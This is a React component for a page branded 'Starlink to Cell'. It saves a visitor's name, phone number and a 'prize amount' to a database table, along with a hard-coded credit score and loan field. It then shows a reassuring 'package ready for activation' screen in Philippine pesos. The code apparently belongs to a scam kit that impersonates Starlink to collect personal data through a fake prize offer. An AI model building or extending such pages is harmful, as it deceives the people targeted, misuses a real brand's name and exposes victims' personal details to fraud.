import { useEffect, useState } from 'react';
import { supabase } from '../lib/supabase';
import { Check, PackageCheck, Satellite, ShieldCheck, Wifi } from 'lucide-react';

interface QualificationPageProps {
  applicationId: string;
  fullName: string;
  phoneNumber: string;
  prizeAmount: number;
}

export default function QualificationPage({
  applicationId,
  fullName,
  phoneNumber,
  prizeAmount,
}: QualificationPageProps) {
  const [lastUpdated] = useState(new Date().toISOString().replace('T', ' ').slice(0, 19));
  const [error, setError] = useState('');

  useEffect(() => {
    const saveSubmission = async () => {
      const { error: dbError } = await supabase.from('final_submissions').insert({
        application_id: applicationId,
        user_name: fullName,
        phone_number: phoneNumber,
        account_status: 'Package selected',
        loan_amount: prizeAmount,
        credit_score: 720,
        last_login: new Date().toISOString(),
      });

      if (dbError) {
        setError('We could not update your package status.');
        console.error('Database error:', dbError);
      }
    };

    saveSubmission();
  }, [applicationId, fullName, phoneNumber, prizeAmount]);

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-100 via-blue-50 to-slate-200 px-4 py-8 text-slate-900 sm:py-12">
      <div className="mx-auto max-w-md space-y-4">
        <header className="flex items-center gap-2 text-blue-950">
          <Satellite size={28} strokeWidth={2.5} />
          <span className="text-xl font-extrabold tracking-tight">Starlink to Cell</span>
        </header>

        {error && <div className="rounded-xl border border-red-200 bg-red-50 p-4 text-sm text-red-700">{error}</div>}

        <section className="rounded-3xl bg-white p-6 shadow-xl sm:p-8">
          <div className="flex items-center gap-3">
            <div className="flex h-12 w-12 items-center justify-center rounded-2xl bg-emerald-100 text-emerald-700">
              <Check size={26} strokeWidth={3} />
            </div>
            <div>
              <p className="text-sm font-semibold text-emerald-700">Request received</p>
              <h1 className="text-2xl font-extrabold text-blue-950">Package selected</h1>
            </div>
          </div>

          <div className="mt-7 rounded-2xl bg-gradient-to-br from-blue-950 to-slate-800 p-6 text-white">
            <div className="flex items-center justify-between gap-3">
              <span className="rounded-full bg-white/15 px-3 py-1 text-xs font-bold uppercase tracking-wide">Starlink Data Package</span>
              <PackageCheck size={24} className="text-cyan-300" />
            </div>
            <p className="mt-6 text-3xl font-extrabold">Package ready</p>
            <p className="mt-2 text-blue-100">{prizeAmount === 0 ? 'Free trial' : `₱${prizeAmount.toLocaleString('en-PH')}`}</p>
          </div>

          <div className="mt-6 space-y-4">
            <div>
              <p className="text-xs font-bold uppercase tracking-wide text-slate-500">Mobile number</p>
              <p className="mt-1 text-xl font-bold text-slate-900">{phoneNumber}</p>
            </div>
            <div>
              <p className="text-xs font-bold uppercase tracking-wide text-slate-500">Status</p>
              <span className="mt-2 inline-flex items-center gap-2 rounded-full bg-emerald-100 px-4 py-2 font-bold text-emerald-700">
                <Check size={17} /> Ready for activation
              </span>
            </div>
          </div>
        </section>

        <section className="rounded-3xl border border-blue-200 bg-blue-50 p-6">
          <div className="flex items-start gap-3">
            <Wifi size={22} className="mt-0.5 shrink-0 text-blue-700" />
            <div>
              <h2 className="font-extrabold text-blue-950">What happens next?</h2>
              <p className="mt-2 text-sm leading-6 text-slate-700">
                Your selected data package will be reviewed for activation on the mobile number provided. Keep your line active for updates.
              </p>
            </div>
          </div>
        </section>

        <div className="flex items-center justify-center gap-2 px-4 text-center text-xs leading-5 text-slate-500">
          <ShieldCheck size={16} className="text-emerald-600" />
          Starlink to Cell · Last updated {lastUpdated}
        </div>
      </div>
    </div>
  );
}
